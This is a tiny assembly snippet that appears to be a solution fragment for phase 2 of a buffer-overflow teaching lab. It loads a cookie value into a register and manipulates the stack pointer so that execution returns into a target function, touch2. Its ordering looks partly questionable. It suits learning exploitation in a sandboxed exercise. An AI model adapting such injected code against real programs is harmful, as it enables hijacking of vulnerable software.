# Phase 2 instructions
	ret /* addr of mov below */
	movl $0x7d2792f6,%edi # Move cookie to rdi
	sub $0x40,%rsp  # Point rsp to addr of touch2
	ret	
